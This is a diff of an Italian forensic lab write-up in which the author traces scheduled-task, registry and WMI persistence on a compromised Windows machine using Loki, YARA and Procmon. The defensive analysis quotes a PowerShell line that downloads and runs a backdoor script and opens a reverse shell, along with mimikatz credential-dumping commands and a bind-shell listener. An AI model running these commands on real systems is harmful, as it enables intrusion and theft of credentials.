@@ -73,7 +73,7 @@ la prima domanda chiede quale chiave di registro contiene lo stesso comando eseg
 
 ho ripreso i comandi di tutte in un colpo solo, invece di aprirle una per una:
 
-for %t in ("GameOver" "falshupdate22" "Clean file system" "check logged in" "update windows" "BADR" "BadrClient") do @schtasks /query /tn %t /fo list /v | findstr /i /c:"Task To Run"
+for %t in ("GameOver" "falshupdate22" "Clean file system" "check logged in" "update windows" "BADR" "BadrClient") do @schtasks /query /tn %t /fo list /v &#124; findstr /i /c:"Task To Run"
 
 Task To Run:                          C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt
 Task To Run:                          powershell.exe -WindowStyle Hidden -nop -c ""
@@ -81,11 +81,11 @@ Task To Run:                          C:\TMP\nc.ps1 -l 1348
 Task To Run:                          "C:\Program Files (x86)\Internet Explorer\iexplore.exe"
 Task To Run:                          "C:\Program Files (x86)\Internet Explorer\ieinstal.exe"
 Task To Run:                          powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\badr\badr-ng.ps1
-Task To Run:                          C:\badr\badr.exe -config C:\badr\config.yaml ...
+Task To Run:                          C:\badr\badr.exe -config C:\badr\config.yaml &#46;&#46;&#46;
 
 BADR e BadrClient le ho scartate subito: la lab machine si chiama letteralmente "YaraChallenge -badr", quindi è infrastruttura della room, non dell'attacco. falshupdate22 esegue un comando powershell vuoto, è un red herring puro e l'ho confermato guardando l'XML:
 
-schtasks /query /tn "falshupdate22" /xml | findstr /i "Arguments Command"
+schtasks /query /tn "falshupdate22" /xml &#124; findstr /i "Arguments Command"
       <Command>powershell.exe</Command>
       <Arguments>-WindowStyle Hidden -nop -c ""</Arguments>
 
@@ -204,7 +204,7 @@ findstr /i "Process Start" C:\cap.csv
 
 che non funziona, perché findstr con più parole tra virgolette le cerca in OR e ti restituisce mezzo file. su 355 MB significa output infinito. la forma giusta usa il match come stringa unica:
 
-powershell -c "sls 'Process Start' C:\cap.csv | %{($_ -split ',')[1]} | sort -u"
+powershell -c "sls 'Process Start' C:\cap.csv &#124; %{($_ -split ',')[1]} &#124; sort -u"
 
 "atbroker.exe"
 "Conhost.exe"
@@ -225,7 +225,7 @@ powershell -c "sls 'Process Start' C:\cap.csv | %{($_ -split ',')[1]} | sort -u"
 
 qui c'è una trappola che ho preso in pieno. in questa lista compare wmic.exe con quattro avvii ravvicinati, e sul momento avevo dato per buono che i due processi ricorrenti fossero powershell.exe e wmic.exe. sbagliato: quei wmic ero io, erano le mie stesse query WMI della fase 3 finite nella cattura. filtrando i tempi si vede benissimo:
 
-powershell -c "sls 'Process Start' C:\cap.csv | ?{$_ -match 'wmic|powershell'} | %{($_ -split ',')[0]+' '+($_ -split ',')[1]}"
+powershell -c "sls 'Process Start' C:\cap.csv &#124; ?{$_ -match 'wmic&#124;powershell'} &#124; %{($_ -split ',')[0]+' '+($_ -split ',')[1]}"
 
 C:\cap.csv:828364:"3:39:04.2790376 PM" "powershell.exe"
 C:\cap.csv:1954386:"3:41:04.2820239 PM" "powershell.exe"
@@ -240,7 +240,7 @@ quindi i due processi sono mim.exe e powershell.exe.
 
 la riga completa del primo Process Start dà tre risposte insieme:
 
-powershell -c "sls 'Process Start' C:\cap.csv | ?{$_ -match 'powershell'} | select -f 1 -exp Line"
+powershell -c "sls 'Process Start' C:\cap.csv &#124; ?{$_ -match 'powershell'} &#124; select -f 1 -exp Line"
 
 "3:39:04.2790376 PM","powershell.exe","4288","Process Start","","SUCCESS","Parent PID: 916, Command line: powershell.exe -WindowStyle Hidden -nop -c """", Current directory: C:\Windows\system32\, Environment:
 
@@ -255,11 +255,11 @@ svchost.exe, che è coerente: le scheduled task vengono lanciate dal Task Schedu
 
 la prima operazione in assoluto del processo è Process Start, verificabile prendendo le prime righe di quel PID:
 
-powershell -c "sls '\"4288\"' C:\cap.csv | select -f 3 -exp Line"
+powershell -c "sls '\"4288\"' C:\cap.csv &#124; select -f 3 -exp Line"
 
-"3:39:04.2790376 PM","powershell.exe","4288","Process Start","","SUCCESS","Parent PID: 916, ...
+"3:39:04.2790376 PM","powershell.exe","4288","Process Start","","SUCCESS","Parent PID: 916, &#46;&#46;&#46;
 "3:39:04.2791009 PM","powershell.exe","4288","Thread Create","","SUCCESS","Thread ID: 4580"
-"3:39:04.2831665 PM","powershell.exe","4288","Load Image","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","SUCCESS","Image Base: ...
+"3:39:04.2831665 PM","powershell.exe","4288","Load Image","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","SUCCESS","Image Base: &#46;&#46;&#46;
 
 Process Start, poi Thread Create, poi Load Image. sequenza canonica di avvio.
 
@@ -267,7 +267,7 @@ per le operazioni su disco, guardando la colonna Process Name delle scritture co
 
 per il conteggio delle scritture per processo, che serve a orientarsi:
 
-powershell -c "sls -s 'WriteFile' C:\cap.csv | %{($_ -split ',')[1]} | sort -u"
+powershell -c "sls -s 'WriteFile' C:\cap.csv &#124; %{($_ -split ',')[1]} &#124; sort -u"
 
 "amazon-ssm-agent.exe"
 "badr.exe"
@@ -298,13 +298,13 @@ c'è un secondo livello di cartella "loki" dentro "loki_0.33.0" e il primo lanci
 
 la prima scansione l'ho fatta solo su C:\TMP per andare veloce:
 
-C:\Users\Administrator\Desktop\Tools\loki_0.33.0\loki\loki.exe -p C:\TMP --noprocscan --dontwait -l C:\loki.log
+C:\Users\Administrator\Desktop\Tools\loki_0.33.0\loki\loki.exe -p C:\TMP &#45;&#45;noprocscan &#45;&#45;dontwait -l C:\loki.log
 
 e questa è stata una scelta sbagliata che mi è costata un giro completo. le domande dalla 24 alla 28 riguardano un binario che sta in C:\Users\Public, quindi fuori da C:\TMP, e con quello scope non compaiono. la scansione va fatta su tutto il disco:
 
-C:\Users\Administrator\Desktop\Tools\loki_0.33.0\loki\loki.exe -p C:\ --noprocscan -l C:\loki.log
+C:\Users\Administrator\Desktop\Tools\loki_0.33.0\loki\loki.exe -p C:\ &#45;&#45;noprocscan -l C:\loki.log
 
-il --noprocscan salta la scansione dei processi in memoria, che su questa VM è la parte che la fa morire. anche così ci mette parecchio e il consiglio della room di lasciarlo girare finché non vedi i warning su ntds.dit è corretto.
+il &#45;&#45;noprocscan salta la scansione dei processi in memoria, che su questa VM è la parte che la fa morire. anche così ci mette parecchio e il consiglio della room di lasciarlo girare finché non vedi i warning su ntds.dit è corretto.
 
 su questo passaggio ho dovuto riavviare la macchina un paio di volte: loki.log non si apriva subito e la VM esauriva RAM a metà scansione. la domanda 29 in particolare è quella che mi ha fatto perdere più tempo di tutte, perché per rispondere "quale binario non compare" devi avere la certezza che la scansione sia arrivata in fondo, altrimenti stai solo guardando un log troncato.
 
@@ -316,7 +316,7 @@ l'output, partendo dall'inizio:
 [INFO] File Name Characteristics initialized with 2973 regex patterns
 [INFO] C2 server indicators initialized with 1548 elements
 [INFO] Malicious MD5 Hashes initialized with 19034 hashes
-...
+&#46;&#46;&#46;
 [INFO] Initialized 682 Yara rules
 
 il modulo dopo Init è WMI Scan, cioè il plugin WMI che Loki registra e poi esegue per primo. è il PluginWMI che vediamo caricato in cima.
@@ -343,7 +343,7 @@ MD5: ******** SHA256: ********
 REASON_1: File Name IOC matched PATTERN: \\nbtscan\.exe SUBSCORE: 60 DESC: Known Bad / Dual use classics
 REASON_2: Malware Hash TYPE: SHA256 SUBSCORE: 100 DESC: Emissary Panda Tools and Malware
 
-i FIRST_BYTES 4d5a9000... sono l'header MZ di un PE, quindi in teoria valgono per qualsiasi eseguibile, ma la domanda si riferisce a questo alert specifico: nbtscan.exe. la description di reason 1 è Known Bad / Dual use classics, cioè un tool a doppio uso noto, legittimo di suo ma classico nell'arsenale offensivo.
+i FIRST_BYTES 4d5a9000&#46;&#46;&#46; sono l'header MZ di un PE, quindi in teoria valgono per qualsiasi eseguibile, ma la domanda si riferisce a questo alert specifico: nbtscan.exe. la description di reason 1 è Known Bad / Dual use classics, cioè un tool a doppio uso noto, legittimo di suo ma classico nell'arsenale offensivo.
 
 [ALERT]
 FILE: C:\TMP\p.exe SCORE: 105 TYPE: EXE SIZE: 381816
@@ -366,12 +366,12 @@ MATCHES: Str1:  -enc  Str2:  -nop  Str3:  -ep bypass  Str4:  -exec bypass
 
 l'alert associato a somethingwindows.dmp è schtasks-backdoor.ps1: Loki processa il dump e il match risultante viene attribuito a quello script, che è anche il file immediatamente adiacente nell'output. lo script l'ho poi aperto per capire cosa contenesse:
 
-type C:\TMP\schtasks-backdoor.ps1 | findstr /i "enc bypass http"
+type C:\TMP\schtasks-backdoor.ps1 &#124; findstr /i "enc bypass http"
 
 C:\Users\test\Desktop>powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/Invoke-taskBackdoor.ps1');Invoke-Tasksbackdoor -method nccat -ip 8.8.8.8 -port 9999 -time 2"
 powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/Invoke-taskBackdoor.ps1');Invoke-Tasksbackdoor -method msf -ip 8.8.8.8 -port 8081 -time 2"
         ps = 'powershell.exe -ep bypass -enc ';
-`$client = New-Object System.Net.Sockets.TCPClient("$Ip",$Port);`$stream = `$client.GetStream();...
+`$client = New-Object System.Net.Sockets.TCPClient("$Ip",$Port);`$stream = `$client.GetStream();&#46;&#46;&#46;
 
 è un generatore di scheduled task backdoor: scarica se stesso da un server, e a seconda del metodo crea una reverse shell TCP pura oppure un payload msf, con intervallo di due minuti. l'8.8.8.8 è ovviamente un placeholder della documentazione dello strumento, non il vero C2, e i due minuti sono esattamente l'intervallo che avevo visto in Procmon fra un powershell.exe e l'altro. i due pezzi combaciano.
 
@@ -397,7 +397,7 @@ la parte che con la scansione limitata a C:\TMP non avevo visto:
 
 FILE: C:\Users\Public\svchost.exe SCORE: **** TYPE: EXE
 MD5: ******** SHA256: ********
-REASON_1: ... DESC: Stuff running where it normally shouldn't
+REASON_1: &#46;&#46;&#46; DESC: Stuff running where it normally shouldn't
 
 svchost.exe è uno dei processi core di Windows e vive esclusivamente in C:\Windows\System32. una copia in C:\Users\Public è masquerading puro: il nome è talmente familiare che in un elenco processi non lo guardi nemmeno. la description di reason 1 è Stuff running where it normally shouldn't, che è la categoria di Loki per i binari fuori posto, e il percorso legittimo è C:\Windows\System32.
 
@@ -435,7 +435,7 @@ rule mimikatz
 
 sono tre pattern con ? come carattere jolly, e la condizione è all of them, quindi servono tre stringhe reali dentro mim.exe che corrispondano a quelle maschere. il modo per trovarle è strings dei Sysinternals con findstr in modalità regex, traducendo ogni ? in un punto:
 
-C:\Users\Administrator\Desktop\Tools\SysinternalsSuite\strings64.exe -accepteula C:\TMP\mim.exe | findstr /r "..\...1 ..\..x. v..\...\.....7"
+C:\Users\Administrator\Desktop\Tools\SysinternalsSuite\strings64.exe -accepteula C:\TMP\mim.exe &#124; findstr /r "..\&#46;&#46;&#46;1 ..\..x. v..\&#46;&#46;&#46;\&#46;&#46;&#46;..7"
 
 PowerShell.ExecutionPolicy
 Service.exe.manifest
@@ -450,12 +450,12 @@ mk.exe
 
 le prime due escono subito: mk.ps1 corrisponde a ??.??1 e mk.exe corrisponde a ??.?x?. la terza no, perché la maschera v?.?.????7 ha una struttura diversa e il mio primo tentativo di regex era sbagliato:
 
-strings64.exe C:\TMP\mim.exe | findstr /r "^v.\...\....7"
+strings64.exe C:\TMP\mim.exe &#124; findstr /r "^v.\&#46;&#46;&#46;\&#46;&#46;&#46;.7"
 (nessun output)
 
 l'errore era ancorare con ^ e sbagliare il conteggio dei caratteri fra i punti. v?.?.????7 significa: v, un carattere, punto, un carattere, punto, quattro caratteri, 7. senza ancora e con i gruppi giusti:
 
-strings64.exe C:\TMP\mim.exe | findstr /r "v.\..\.....7"
+strings64.exe C:\TMP\mim.exe &#124; findstr /r "v.\..\&#46;&#46;&#46;..7"
 
 <supportedRuntime version="v2.0.50727" />
 v2.0.50727
@@ -474,7 +474,7 @@ alcune cose le ho verificate anche se non erano domande, perché servivano a chi
 
 le credenziali effettivamente rubate:
 
-type C:\TMP\mim-out.txt | findstr /i "Username Password NTLM"
+type C:\TMP\mim-out.txt &#124; findstr /i "Username Password NTLM"
 
 mimikatz(powershell) # sekurlsa::logonpasswords
          * Username : Ion
@@ -507,7 +507,7 @@ BadrClient   REG_SZ    wscript.exe "C:\badr\start-badr.vbs" //B //Nologo
 
 le regole firewall custom stavolta non c'erano più:
 
-netsh advfirewall firewall show rule name=all | findstr /i "1348"
+netsh advfirewall firewall show rule name=all &#124; findstr /i "1348"
 (nessun output)
 
 le 1337 e 8888 della room precedente non risultano su questa istanza. può essere una differenza fra gli snapshot delle due room oppure un reset, in ogni caso l'ho annotato come artefatto assente e non l'ho usato per la timeline.
@@ -524,17 +524,17 @@ timeline ricostruita, orari UTC del 2 marzo 2019 dove disponibili.
 16:45     dump di memoria somethingwindows.dmp, generazione di schtasks-backdoor.ps1
 16:46     ricognizione NetBIOS con nbtscan, scan1/2/3.tmp restituiscono zero byte
 16:47     registrazione delle scheduled task malevole
---        drop di C:\Users\Public\svchost.exe (masquerading su processo core) e di en-US.js (loader CACTUSTORCH)
---        registrazione delle due WMI event subscription tramite WMIBackdoor.ps1:
+&#45;&#45;        drop di C:\Users\Public\svchost.exe (masquerading su processo core) e di en-US.js (loader CACTUSTORCH)
+&#45;&#45;        registrazione delle due WMI event subscription tramite WMIBackdoor.ps1:
              TimingIntervalTrigger -> LaunchBeaconingBackdoor, beacon VBScript ogni 3600000 ms
              verso http://googleaccountsservices.com/index.html&ID=<MachineGuid>
              ProcessStartTrigger -> KillProcess, termina procexp64.exe all'avvio
---        HKCU\Environment\UserInitMprLogonScript impostata su mim.exe, mimikatz a ogni logon
---        task GameOver: mim.exe sekurlsa::LogonPasswords, stesso comando della chiave
---        task Clean file system: nc.ps1 -l 1348, bind shell giornaliera
---        task falshupdate22: powershell vuoto, esca
---        chiavi Run: p.exe verso 10.34.2.3 (movimento laterale interno), start-badr.vbs silenzioso
---        hosts avvelenato: update.microsoft.com, virustotal e sophosupd neutralizzati, google.com su 76.32.97.132
+&#45;&#45;        HKCU\Environment\UserInitMprLogonScript impostata su mim.exe, mimikatz a ogni logon
+&#45;&#45;        task GameOver: mim.exe sekurlsa::LogonPasswords, stesso comando della chiave
+&#45;&#45;        task Clean file system: nc.ps1 -l 1348, bind shell giornaliera
+&#45;&#45;        task falshupdate22: powershell vuoto, esca
+&#45;&#45;        chiavi Run: p.exe verso 10.34.2.3 (movimento laterale interno), start-badr.vbs silenzioso
+&#45;&#45;        hosts avvelenato: update.microsoft.com, virustotal e sophosupd neutralizzati, google.com su 76.32.97.132
 
 la logica dell'impianto è ridondanza su piani diversi. la persistenza sta contemporaneamente nel Task Scheduler, nel registro utente, nelle chiavi Run e nel repository WMI, che sono quattro posti che si controllano con quattro strumenti diversi. il beaconing usa VBScript dentro WMI, che non lascia file sul disco. e il consumer KillProcess è difesa attiva: non nasconde le tracce, impedisce proprio che tu apra lo strumento con cui le vedresti.
 
